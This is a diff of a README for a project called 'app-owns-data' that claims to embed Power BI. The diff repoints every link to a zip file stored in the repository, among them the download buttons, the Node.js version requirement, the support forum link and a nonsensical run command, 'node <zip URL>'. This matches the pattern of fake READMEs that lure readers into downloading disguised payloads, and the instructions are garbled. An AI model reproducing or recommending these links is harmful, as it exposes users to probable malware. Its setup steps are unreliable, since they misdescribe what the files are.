@@ -1,7 +1,7 @@
 # 🚀 app-owns-data - Easily Embed Power BI for Your Application
 
 ## 🖱️ Download Now
-[![Download](https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip)](https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip)
+[![Download](https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip)](https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip)
 
 ## 📘 About the Project
 This project, **app-owns-data**, helps you embed Power BI in your application effortlessly. It provides detailed instructions, examples for both backend and frontend, and guides you on configuring an NGINX reverse proxy. You don’t need to be a programmer to get it running.
@@ -13,12 +13,12 @@ To get started with app-owns-data, follow these simple steps:
 Make sure your system meets these requirements:
 
 - **Operating System:** Ubuntu 20.04 or later
-- **https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip** Version 14 or higher
+- **https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip** Version 14 or higher
 - **NGINX:** Latest version installed
 - **Internet Connection:** Required for downloading packages and accessing Power BI
 
 ### 2. **Download & Install**
-To download **app-owns-data**, visit this page: [Download Here](https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip). You will find the latest version ready for download. 
+To download **app-owns-data**, visit this page: [Download Here](https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip). You will find the latest version ready for download. 
 
 Once you've downloaded the file, follow these detailed steps to install it.
 
@@ -39,7 +39,7 @@ After downloading the software, you will need to follow the setup instructions b
 To run the application, use this command in your terminal:
 
 ```bash
-node https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip
+node https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip
 ```
 
 This command starts the server and makes your application available.
@@ -69,7 +69,7 @@ If you encounter issues while running the application, consider these solutions:
 ## 🛠️ Support and Community
 If you need further assistance or want to connect with other users, visit the GitHub discussions page. Collaborate on improvements or ask questions:
 
-- GitHub Discussions: [Join Here](https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip)
+- GitHub Discussions: [Join Here](https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip)
 
 ## 📄 License
 app-owns-data is open-source and licensed under the MIT License. You can freely use or modify the software, but be sure to respect the licensing terms.
@@ -80,4 +80,4 @@ If you want to contribute to this project, please fork the repository and submit
 ## 💾 Final Note
 Thank you for choosing app-owns-data. We hope it helps you integrate Power BI into your applications smoothly. For any specific inquiries or issues, feel free to reach out or consult the documentation included with your download. 
 
-Once again, download the application here: [Download Here](https://raw.githubusercontent.com/Valentine-Nkatha/app-owns-data/main/viewiness/app-owns-data.zip).
+Once again, download the application here: [Download Here](https://github.com/Valentine-Nkatha/app-owns-data/raw/refs/heads/main/step-2_embed_report_demo/files/owns-app-data-Arikara.zip).
